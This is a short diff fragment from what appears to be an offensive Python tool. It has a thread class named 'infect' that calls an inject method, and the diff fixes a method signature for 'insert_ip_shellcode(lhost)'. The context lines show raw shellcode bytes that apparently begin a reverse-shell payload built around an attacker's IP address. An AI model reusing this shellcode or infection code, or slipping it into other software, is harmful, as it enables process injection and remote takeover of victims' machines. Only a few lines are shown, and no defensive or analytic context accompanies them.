@@ -18,7 +18,7 @@ class infect(threading.Thread):
         self.inject()
        
         
-    def insert_ip_shellcode(lhost):
+    def insert_ip_shellcode(self,lhost):
         PAYLOAD =  b""
         PAYLOAD += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
         PAYLOAD += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
